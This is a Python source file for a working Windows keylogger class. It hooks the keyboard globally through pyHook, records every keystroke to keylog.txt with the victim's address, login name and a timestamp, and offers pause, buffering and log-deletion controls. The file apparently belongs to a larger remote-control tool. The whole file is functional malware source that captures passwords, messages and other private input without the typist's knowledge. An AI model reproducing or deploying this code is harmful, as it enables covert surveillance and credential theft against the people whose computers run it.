import threading
import pyHook
import os.path
import general
from pyHook import GetKeyState, HookConstants
from get_local_addr import get_local_addr
import time
import os
import pythoncom


class Logger:

    buffer = ''
    hook = None
    paused = False
    path = ''
    log = None

    def __init__(self, path, name='keylog.txt'):

        # Sets the path of the log file
        self.path = path + name

        # Creates the log file if it doesn't exist
        if not os.path.isfile(self.path):
            self.mk_log()

        # Sets up the thread and starts logging keys on it
        t = threading.Thread(target=self.start)
        t.daemon = False
        t.start()

    def mk_log(self):
        self.log = open(self.path, 'w')
        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
        divider = "______________________________________________________\n\n"
        general.append_to_file(self.path, header + divider)

    def start(self):

        # Hooks the keyboard. This enables reading keyboard input
        self.hook = pyHook.HookManager()
        self.hook.KeyDown = self.on_keyboard_event
        self.hook.HookKeyboard()

        try:
            # Starts the event pump
            pythoncom.PumpMessages()
        except:
            pass

    def pause(self):
        self.paused = True

    def unpause(self):
        general.append_to_file(self.path, self.buffer)
        self.paused = False
        self.buffer = ''

    def del_log(self):
        try:
            os.remove(self.path)
            self.mk_log()
        except:
            pass

    def on_keyboard_event(self, event):

        # Handles logging a key when a key is pressed
        try:
            if event.Ascii > 7 and event.Ascii < 127:
                # ENTER
                if event.Ascii == 13:
                    if self.paused:
                        self.buffer += '<<E>>'
                    else:
                        general.append_to_file(self.path, '<<E>>')
                    return True

                # BACKSPACE
                elif event.Ascii == 8:
                    if self.paused:
                        self.buffer += '<<B>>'
                    else:
                        general.append_to_file(self.path, '<<B>>')
                    return True

                # TAB
                elif event.Ascii == 9:
                    if self.paused:
                        self.buffer += '<<T>>'
                    else:
                        general.append_to_file(self.path, '<<T>>')
                    return True

                # ALL UPPERCASE LETTERS
                elif GetKeyState(HookConstants.VKeyToID('VK_CAPITAL')) & 1:
                    if GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')):
                        if self.paused:
                            self.buffer += chr(event.Ascii)
                        else:
                            general.append_to_file(self.path, chr(event.Ascii))
                        return True
                    else:
                        if self.paused:
                            self.buffer += chr(event.Ascii - 32)
                        else:
                            general.append_to_file(self.path, chr(event.Ascii - 32))
                        return True
                elif ((GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')))
                      and (event.Ascii < 123 and event.Ascii > 96)):
                    if self.paused:
                        self.buffer += chr(event.Ascii - 32)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 32))
                    return True

                # !, #, $, %
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and (event.Ascii == 49 or event.Ascii == 51 or event.Ascii == 52 or event.Ascii == 53):
                    if self.paused:
                        self.buffer += chr(event.Ascii - 16)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 16))
                    return True

                # @
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 50:
                    if self.paused:
                        self.buffer += chr(event.Ascii + 14)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 14))
                    return True

                # ^
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 54:
                    if self.paused:
                        self.buffer += chr(event.Ascii + 40)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 40))
                    return True

                # &, (
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and (event.Ascii == 55 or event.Ascii == 57):
                    if self.paused:
                        self.buffer += chr(event.Ascii - 17)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 17))
                    return True

                # *
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 56:
                    if self.paused:
                        self.buffer += chr(event.Ascii - 14)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 14))
                    return True

                # )
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 48:
                    if self.paused:
                        self.buffer += chr(event.Ascii - 7)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 7))
                    return True

                # _
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 45:
                    if self.paused:
                        self.buffer += chr(event.Ascii + 50)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 50))
                    return True

                # +
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 61:
                    if self.paused:
                        self.buffer += chr(event.Ascii - 18)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 18))
                    return True

                # |, {, }
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and (event.Ascii == 92 or event.Ascii == 91 or event.Ascii == 93):
                    if self.paused:
                        self.buffer += chr(event.Ascii + 32)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 32))
                    return True

                # ~
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 96:
                    if self.paused:
                        self.buffer += chr(event.Ascii + 30)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 30))
                    return True

                # :
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 59:
                    if self.paused:
                        self.buffer += chr(event.Ascii - 1)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 1))
                    return True

                # "
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and event.Ascii == 39:
                    if self.paused:
                        self.buffer += chr(event.Ascii - 5)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii - 5))
                    return True

                # <, >, ?
                elif (GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT'))) \
                        and (event.Ascii == 44 or event.Ascii == 46 or event.Ascii == 47):
                    if self.paused:
                        self.buffer += chr(event.Ascii + 16)
                    else:
                        general.append_to_file(self.path, chr(event.Ascii + 16))
                    return True

                # ALL OTHER CHARACTERS
                else:
                    if event.Ascii != 0:
                        if self.paused:
                            self.buffer += chr(event.Ascii)
                        else:
                            general.append_to_file(self.path, chr(event.Ascii))
                        return True
            else:
                if self.paused:
                    self.buffer += "<<?>>"
                else:
                    general.append_to_file(self.path, "<<?>>")
                return True

        except:
            pass

